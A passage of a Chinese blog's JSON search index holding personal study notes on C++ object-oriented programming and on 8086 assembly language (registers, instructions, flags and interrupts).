赋值运算符重载 ClassName\u0026 operator= (const ClassName\u0026 right){ if (this != \u0026right){ //避免自己赋值给自己 //将right对象中的内容复制到当前对象中 } return *this; } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:18","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 流运算符重载 重载函数的声明（作为友元） class Test{ int id; public: friend istream\u0026 operator\u003e\u003e (istream\u0026 in, Test\u0026 dst); friend ostream\u0026 operator\u003c\u003c (ostream\u0026 out, const Test\u0026 src); }; 重载函数实现 istream\u0026 operator\u003e\u003e (istream\u0026 in, Test\u0026 dst){ in \u003e\u003e dst.id; return in; } ostream\u0026 operator\u003c\u003c (ostream\u0026 out, Test\u0026 src){ out \u003c\u003c src.id \u003c\u003c endl; return out; } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:19","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 函数运算符()重载 重载函数实现 ReturnType operator() (Parameters){ …… } className obj; obj(Real_parameters); //obj.operator() (Real_parameters); 重载示例 class Test{ public: int operator() (int a, int b){ return a + b; } }; int main(){ Test sum; cout\u003c\u003csum(1,2); return 0; } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:20","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 下标运算符[]重载 重载函数返回类型 若是引用，则可出现在等号左边，即obj[index]=value 若不是引用，则只能出现在等号右边，即var=obj[index] 重载函数示例 #include\u003ciostream\u003e #include\u003cstring\u003e //strcmp using namespace std; char week_name[7][4] = {\"mon\", \"tu\", \"wed\", \"thu\", \"fri\", \"sat\", \"sun\"}; class WeekTemp{ int temp[7]; public: int\u0026 operator[] (const char* name){ for(int i = 0; i \u003c 7; i++){ if (strcmp (week_name[i], name) == 0) return temp[i]; } } }; int main(){ WeekTemp beijing; beijing[\"mon\"] = -3; beijing[\"tu\"] = -1; return 0; } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:21","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 自增减运算符++--重载 前缀运算符重载声明 ReturnType operator++() ReturnType operator--() 后缀运算符重载声明 ReturnType operator++(int dummy);//dummy为哑元，无实际意义，只为区分 ReturnType operator--(int dummy); 静态成员与常量成员 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:22","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 静态成员 以static修饰的数据成员，属于类，被所有对象共享 为静态数据赋初值Type ClassName::static_var = value; 返回值类型前面加上static修饰的成员函数，不能调用非静态成员函数，没有this指针 类的静态成员（数据，函数）既可以通过对象访问，也可以通过类名来访问 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:23","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 常量成员 以const修饰的数据成员，在对象的整个生命周期中不可更改 只能在构造函数的初始化列表中被设置，不允许在函数体中通过赋值来设置 用const修饰成员函数，则该成员函数在实现时不能有改变对象状态（内容）的语句 若对象被定义为常量，则它只能调用以const修饰的成员函数，普通函数不允许调用 移动（拷贝）构造函数 用来“偷”临时变量\"的资源，没有名字如返回值等的变量 语法ClassName(ClassName\u0026\u0026) 示例 class Test{ public: int* buf; Test(Test\u0026\u0026 t) : buf(t.buf){ t.buf = nullptr; } } 类中成员函数default ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:24","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 编译器自动生成的成员函数 默认构造函数：空函数，什么也不做 析构函数：空函数，什么也不做 拷贝构造函数：按bit位复制对象所占内存的内容 移动构造函数：同上 赋值运算符重载：同上 注意：若用户定义了上述某个成员函数，则编译器不再自动生成相应的默认实现 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:25","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 同时使用编译器提供的成员函数 class T{ int data; public: T() = default; T(int i) : data(i) {} }; 继承 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:26","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 含义 在已有类(Base class)的基础上，通过继承来定义新的类(Derived class) ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:27","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 继承方式 private继承（缺省继承） class Derived : [private] Base{……}; public继承 class Derived : public Base{……}; ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:28","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 继承基类构造函数 class Base{ int data; public: Base(int i) : data(i) {……} }; class Derive : public Base{ int data; using Base::Base; //继承基类构造函数 } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:29","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 派生类中的基类成员 派生类中包含从基类继承来的数据成员，它们构成了“基类子对象” 基类中的私有成员private，不允许在派生类成员函数中被访问，也不允许派生类的对象访问 基类中的公有成员public pubilc继承：成为派生类的公有成员 private继承：只能供派生类成员函数访问，不能被派生类的对象访问 基类中的保护成员protected public继承：可以访问 private继承：变成private成员 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:30","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 派生类中函数重写（override） 基类已定义的成员函数，在派生类中可以重新定义，称为“函数重写” 重写的函数参数，返回值应与原函数一模一样 重写发生时，基类中该成员函数的其他重载函数都将被屏蔽掉，不能提供给派生类对象使用 可以在派生类中通过using 类名::成员函数名在派生类中恢复制定的成员函数，去掉屏蔽 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:31","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 向上映射和向下映射 向上映射：由派生类对象转换为基类对象 向上映射可以由编译器自动完成，是一种隐式的自动转换 凡是接受基类对象的地方（如函数参数），都可以使用派生类对象，编译器会自动将派生类对象转换为基类对象 class Base{ public: void print(){cout \u003c\u003c \"Base::print()\" \u003c\u003c endl;} }; class Derive : public Base{ public: void print(){cout \u003c\u003c \"Derive::print()\" \u003c\u003c endl;} }; void fun(Base obj){ obj.print(); } int main(){ Derive d; d.print(); //Derive::print() fun(d); //Base::print()发生了向上映射 return 0; } 向下映射：由基类对象转换为派生类对象 使用虚函数，让编译器自动选择合适的函数 class Base{ public: virtual void print(){cout \u003c\u003c \"Base::print()\" \u003c\u003c endl;} }; class Derive : public Base{ public: void print(){cout \u003c\u003c \"Derive::print()\" \u003c\u003c endl;} }; void fun(Base\u0026 obj){ //obj 必须是对Base类的引用 obj.print(); } int main(){ Derive d; d.print(); //Derive::print() fun(d); //Derive::print()编译器根据d的类型选择了合适的函数 return 0; } 虚析构函数 class B{ public: virtual void show(){cout \u003c\u003c \"B.show()\";} virtual ~B(){cout \u003c\u003c \"~B()\";} }; class D : public B{ public: void show(){cout \u003c\u003c \"D.show()\";} ~D(){cout \u003c\u003c \"~D()\";} }; void test(B* ptr){ //若删除virtual ptr -\u003e show(); //运行结果 运行结果 } //D.show() D.show() int main(){ //~D() ~B() B* ptr = new D; //~B() test(ptr); delete ptr; return 0; } 禁止重写的虚函数（final关键字） class A{ public: virtual void fun() = 0; }; class B : public A{ public: void fun() final; //后续子类不可重写此接口函数 }; class C ：public B{ public: void fun(); //编译错误 }; 纯虚函数 fun()=0 包含纯虚函数的类不允许定义对象，只能为子类提供接口 不同类之间自动类型转换 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:32","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 在源类中定义“目标类型转换运算符“ class Dst{ public: Dst(){cout \u003c\u003c \"Dst::Dst()\" \u003c\u003c endl;} }; class Src{ public: Src(cout \u003c\u003c \"Src::Src() \u003c\u003c endl\" \u003c\u003c endl;) operator Dst() const{ cout \u003c\u003c \"src::operator Dst() called\" \u003c\u003c endl; return Dst(); } }; ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:33","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 在目标类中定义“源类对象做参数的构造函数” class Src; //前置类型声明 class Dst{ public: Dst() {cout \u003c\u003c \"Dst::Dst()\" \u003c\u003c endl;} Dst(const Src\u0026 s){ cout \u003c\u003c \"Dst::Dst(const Src\u0026)\" \u003c\u003cendl; } }; class Src{ public: Src(){cout \u003c\u003c \"Src::Src()\" \u003c\u003c endl;} } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:34","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 禁止自动类型转换 分别对应以上两种方法，加关键词explicit class Dst{ public: Dst(){cout \u003c\u003c \"Dst::Dst()\" \u003c\u003c endl;} }; class Src{ public: Src(cout \u003c\u003c \"Src::Src() \u003c\u003c endl\" \u003c\u003c endl;) explicit operator Dst() const{ cout \u003c\u003c \"src::operator Dst() called\" \u003c\u003c endl; return Dst(); } }; class Src; //前置类型声明 class Dst{ public: Dst() {cout \u003c\u003c \"Dst::Dst()\" \u003c\u003c endl;} explicit Dst(const Src\u0026 s){ cout \u003c\u003c \"Dst::Dst(const Src\u0026)\" \u003c\u003cendl; } }; class Src{ public: Src(){cout \u003c\u003c \"Src::Src()\" \u003c\u003c endl;} } 利用=delete禁止自动类型转换 class T{ public: T (int){} T (char) = delete; } void fun(T t) {} int main(){ fun(1); fun('x'); //编译不通过 } 强制类型转换 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:35","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- dynamic_cast\u003cDst_Type\u003e(Src_var) Src_var必须是引用或指针类型，Dst_Type类中含有虚函数，否则会有编译错误 若目标类与源类之间没有继承关系，则转换失败，返回空指针 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:36","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- static_cast\u003cDst_Type\u003e(Src_var) 基类对象不能转换成派生类对象，但基类指针可以转换为派生类指针 派生类对象（指针）可以转换为基类对象（指针） 没有继承关系的类之间，必须有转换途径才能进行转换 函数模板 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:37","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 函数模板的定义 template\u003ctypename T\u003e 返回类型 函数名称（函数参数） template\u003ctypename T\u003e T sum(T a, T b){return a + b;} ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:38","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 函数模板参数可赋默认值 template\u003ctypename T0 = float, typename T1, typename T2 = float, typename T3, typename T4\u003e T0 fun(T1 v1, T2 v2, T3 v3, T4 v4){……} …… fun(1,2,3); fun('a','b','cdf'); 类模板 基本定义 template\u003ctypename T\u003eclass A{ T data; public: void print(){cout \u003c\u003c data;} }; 类模板使用流程 类模板—实例化—\u003e类—实例化—\u003e对象 类模板参数 类型参数：使用typename或class标记 非类型参数：整数，枚举，指针（指向对象或函数），引用（引用对象或函数） template\u003ctypename T, unsigned size\u003e class array{ T elems[size]; …… }; array\u003cchar,10\u003e array0; //用类模板实例定义对象 模板参数是另一个类模板 template\u003ctypename T, template\u003ctypename TT0, typename TT1\u003e class A\u003e struct Foo{ A \u003cT,T\u003ebar; }; 模板特化 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:39","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 函数模板特化 template\u003ctypename T\u003e T sum(T a, T b){ return a+b; } template\u003c\u003e char* sum(char* a, char* b){ char* p = new char[strlen(a) + strlen(b) + 1]; strcpy(p, a); strcat(p, b); return p; } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:40","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 类模板特化 //通用类模板 template\u003cclass T1, class T2\u003e class A{……}; //部分特化的模板类：第二个参数指定为int（偏特化） template\u003cclass T1\u003e class A \u003cT1, int\u003e{……}; //指定所有类型 template\u003c\u003e class A \u003cint, int\u003e {……}; ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:41","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Binary"],"content":"8086CPU汇编 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:0","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- 8086CPU有14个寄存器 数据寄存器：AX,BX,CX,DX 其他寄存器：CS:IP,SS:SP,DS,ES,SI,DI,BP,FLAG(PSW) 8086CPU每一个寄存器都是16位的，存放2个字节 通用寄存器都可以分为两个独立的8位寄存器使用，如AL（低8位）,AH（高8位） 16位CPU特征： 运算器一次最多可以处理16位数据 寄存器的最大宽度为16位 寄存器和运算器之间的通路是16位的 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:1","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- 8086CPU有20根地址总线 8086CPU采用在内部用两个16位地址合成（地址加法器）的方法形成一个20位的物理地址 物理地址 = 段地址 * 16 + 偏移地址（16进制地址左移一位） 推论：偏移地址为16位（0-FFFFH）–\u003e一个段最大长度位64kb（$2^{16}$) ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:2","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- CS(Code Segment):IP(Instruction Pointer) CS:IP指向CPU当前所要执行指令的地址 IP递增器：执行完一条指令后，IP自动递增该指令的长度，跳到下一条指令 8086CPU加电启动或复位后，设置CS=FFFFH，IP=0000H 修改CS:IP寄存器的值 同时修改CS:IP的内容：jmp 段地址：偏移地址 仅修改IP的内容：jmp 某一合法寄存器（mov ax xxxx，jmp ax） ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:3","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- DS(Data Segment)和[address]（偏移地址） 经由通用寄存器将数据送入DS寄存器 mov ax, 1000H mov ds, ax 使用[address]读写内存（确定好ds） mov ax, [0] //把偏移地址为0处内存的值送入ax mov [0], cx //把cx中的值写入偏移地址为0的内存 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:4","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- 栈 push ax：把ax中的值送入栈中 pop ax：把从栈顶取出数据送入ax 8086CPU入栈和出栈都是以字（16位）为单位进行的 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:5","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- SS(Stack Segment):SP(Stack Pointer) push ax SP = SP - 2 将ax中的内容送入SS:SP指向的内存单元处，此时SS:SP指向新栈顶 pop ax 将SS:SP指向的内存单元中数据取出送入ax中 SP = SP + 2 栈空时SS:SP指向栈最高地址（栈底）的偏移地址+2 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:6","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- 伪指令 编译器执行，无法汇编成机器码 一个段 assume cs:段名–\u003e寄存器与段的关联假设 段名 segment 段名 ends end：结束对源程序的编译 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:7","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- [BS] 作为偏移地址索引内存，默认段地址在ds中 mov ax [1000H]只是将1000H作为值送入ax 经由bx寄存器才能将偏移地址为1000H的内容送入ax mov bx, 1000H mov ax, [bx] ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:8","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- loop指令 loop实现循环，cx寄存器作为循环累加器 格式 mov cx，循环次数 标号：循环执行代码 loop 标号 执行loop时cx = cx - 1，判断cx不为0则继续循环 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:9","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- SI（Source Index）DI（Destination Index） 与bx功能相近，但不能拆为两个8位寄存器 用ds;si指向源数据地址，用ds:di指向目标数据地址 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:10","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- BP（Base Pointer） 作为偏移地址指向内存，段地址默认在SS中 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:11","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- div（division）指令 除法指令 除数：8位或16位，在寄存器或内存单元中 被除数：（默认）放在ax或ax和dx中 除数8位，被除数16位—»ax 除数16位，被除数32位—»ax（低16位）和dx（高16位） 结果 商存放在ax中 余数存放在dx中 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:12","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- jmp指令 jmp short 标号 段内短转移 8位地址偏移，而非指定跳转地址 jmp near 标号 段内近转移 16位地址偏移，而非指定跳转地址 jmp far 标号 段间转移，远转移 指定段地址和偏移地址，修改CS:IP的值 jmp 寄存器 16位段内转移 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:13","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- jcxz指令 有条件转移指令，短转移 8位地址位移，而不是指定跳转地址 jcxz 标号 当cx=0时跳转，cx!=0时不跳转 loop指令，cx=0时跳出循环，cx！=0时继续循环 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:14","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- call，ret指令 ret：用栈中的值修改IP的值 retf：用栈中的值修改CS:IP的值 call指令 将当前的IP或CS:IP压入栈中 转移（jmp）标号 call不能实现短转移（可近转移和短转移），除此之外和jmp指令原理相同 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:15","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- mul指令 存储位置 都是8位：相乘的两个数存在al或内存中，结果存在ax中 都是16位：相乘的两个数存在ax或内存中，结果存在dx（高位）和ax（低位）中 格式 mul 寄存器 mul内存单元 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:16","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- flag寄存器 8086CPU中flag寄存器的1,3,5,12,13,14,15位没有使用 记录上一条指令后的各种状态，随时改变 ZF（Zero Flag）标志-6 表示结果是否为0,值为1则表示0,值为0则表示非0 add、sub、mul、div、inc、or、and等运算指令会影响标志寄存器 mov、push、pop等传送指令对标志寄存器没有影响 PF（Parity Flag）标志-2 奇偶校验位，1为偶数，0为奇数 SF（Sign Flag）标志-7 符号（正负）标志位，1为负，0为正 CF（Carry Flag）标志-0 记录了进行无符号运算的时候运算结果的最高有效位是否向更高位的进位或借位，8位 OF（Overflow Flag）标志-11 进行有符号数运算时，超过了机器所能表达的范围，将产生溢出 DF（Direction Flag）标志-10 方向标志位，在串处理指令中，控制每次操作后si,di的增减 DF=0,每次操作后si,di递增，cld指令设置为0 DF=1,每次操作后si,di递减，std指令设置为1 IF（Interrupt Flag）标志-9 是否响应外部可屏蔽中断请求 1-允许响应，0-不允许响应 TF（Trace Flag）标志-8 当TF为1时，CPU进入单步调试模式，执行完每一条指令后产生单步中断 AF（Auxiliary Carry Flag）标志-4 辅助进位标志，进位（借位）标志 与CF区别：4位运算有进位（借位）则置1,主要在BCD码时用到 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:17","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- adc指令 带进位加法指令，利用了 CF位上记录的进位值 格式：adc ax, bx 实际：ax = ax + bx + CF add ax, bx //等价于 add al, bl adc ah, bh ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:18","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- sbb指令 带借位减法指令，利用了CF上记录的借位值 格式：sbb ax, bx 实际：ax = ax -bx - CF ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:19","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- cmp指令 格式：cmp 对象1, 对象2 功能：对象1-对象2，不保存结果，将对标志寄存器产生影响 例：cmp ax，ax ZF=1 PF=1 SF=0 CF=0 OF=0 例：mov ax,8 mov bx, 3 cmp ax, bx ZF=0 PF=1 SF=0 CF=0 OF=0 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:20","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- 根据cmp结果的转移指令 //无符号数运算跳转 je：等于则转移（ZF=1） jne：不等于则转移（ZF=0） jb：低于则转移（CF=1） jnb：不低于则转移（CF=0） ja：高于则转移（CF=0,ZF=0） jna：不高于则转移（CF=1或ZF=1） ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:21","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- movsb指令 以字节为单位传送字符串，将ds:si指向的内存单元中的字节送入es:di中，然后根据DF标志位同步递增或递减si,di的值 以字为单位传送：movsw rep movsb：根据cx中的值，重复执行后面的串传送指令，循环实现cx个字符的传送 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:22","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- pushf和popf指令 pushf：将标志寄存器的值压栈 popf：从栈中弹出数据，送入标志寄存器中 为直接访问标志寄存器提供了一种方法 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:23","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- 中断 CPU处理突发事件的一个重要技术，处理完成后立即返回断点，继续工作 硬件中断 外部中断：外部设备发出的中断请求，利用中断控制器可屏蔽 内部中断：除法除数为0,溢出中断，不可屏蔽的中断 软件中断 不是真正的中断，只是可被调用执行的一般程序以及DOS的系统功能调用（INT 21H） 中断优先权 除法错误、溢出中断、软件中断 不可屏蔽中断 可屏蔽中断 单步中断 中断类型码 8086CPU用8位中断类型码索引中断处理程序 中断类型码对应中断向量表中的地址指向中断处理程序 8086CPU中断过程 （从中断信息中）取得中断类型码 标志寄存器的值入栈（保护标志位）–»pushf 设置标志寄存器8-TF和9-IF为0 –»TF=0,IF=0 cs的内容入栈 –»push CS IP的内容入栈 –»push IP 从内存地址为中断类型码*4和中断类型码*4+2的两个字单元中读取中断处理程序的入口地址设置IP和CS 中断处理程序 保存用到的寄存器 处理中断 恢复用到的寄存器 用iret指令返回（pop IP pop CS popf） ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:24","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- int中断 内中断，引发中断过程 格式：int 中断类型码 int 21中断： int中断例程的4c号功能，即程序返回功能 mov ax，4c00h //等价于 mov ah, 4ch ;程序返回 mov al, 0 ;返回值，0表示正常返回 int 21h ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:25","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- CPU端口 利用in和out指令从指定端口中读或写数据 8位端口用al寄存器，访问16位端口用ax寄存器 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:26","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- shl和shr指令 逻辑移位指令 将一个寄存器或内存单元中的数据向左（右）移 将最后多余的一位写入CF中 最低位以0来补充 如果移动位数大于1,必须将移动位数放在cl中 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:27","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- CMOS RAM 70H是CMOS RAM地址（读取）端口，71H是写入端口 CMOS RAM中存放着当前时间，以下信息长度均为1个字节 秒：00H 分：02H 时：04H 日：07H 月：08H 年：09H ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:28","tags":["assembly"],"title":"8086CPU汇编","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- bcd码 每4位表示一个十进制位 4位内部用二进制0000–1001表示0-9 